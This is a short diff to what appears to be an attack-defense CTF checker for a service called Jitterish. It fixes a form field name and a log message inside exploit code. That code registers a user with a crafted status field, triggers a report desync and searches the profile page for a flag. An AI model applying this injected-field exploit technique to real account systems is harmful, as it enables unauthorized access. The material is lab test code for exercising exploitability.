@@ -465,7 +465,7 @@ async def signup_broken(client: JitterishClient):
     username = generate_username()
     password = generate_password()
     data = {"username": username, "password": password, "firstname": "script", "lastname": "script",
-            "status": '{"num_reports":[]}', "accounttype": "business"}
+            "status": '{"num_reports":[]}', "account_type": "business"}
     await client.post('/session/register', data=data, follow_redirects=True)
     await client.logout()
     client.client.cookies.clear()
@@ -503,7 +503,7 @@ async def exploit_desync(task: ExploitCheckerTaskMessage, logger: LoggerAdapter,
     # report broken user
     await client.report(broken, reason)
     # report gameserver
-    logger.info(f'Exploiting target_user')
+    logger.info(f'Exploiting {target_user}')
     await client.report(target_user, reason)
     res = await client.get('/session/profile')
     return searcher.search_flag(res.text)
